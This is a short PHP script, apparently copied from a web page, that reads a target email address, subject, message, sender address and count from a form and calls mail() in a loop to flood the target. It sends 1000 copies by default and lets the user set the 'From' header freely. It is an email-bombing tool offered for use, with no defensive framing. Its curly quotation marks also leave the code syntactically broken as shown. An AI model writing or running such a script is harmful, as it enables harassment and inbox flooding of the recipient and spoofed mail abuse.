<?php  
 
    $num = 1;
    $email = $_POST[’email’];
    $spam = $_POST[‘spam’];
    $subject = $_POST[‘subject’];
    $message = $_POST[‘message’];
    $from = $_POST[‘from’];
    $send = $_POST[‘send’];
    if($spam==’ ‘)
    {
      $spam = 1000; // this is for if the Amount to send = nothing then it will send 1000 emails
           // you can change it too what-ever you want.
    }
   
   
    if($spam!=” && $email==”)
    {
        die(‘Please enter an email!.’);
    }
   
    if($email != ”)
    {
        while($num<=$spam)
        {
            mail ($email, $subject, $message, “From: ” . $from);
            echo $num . “<br>”;
            $num++;
        }  
    }
?>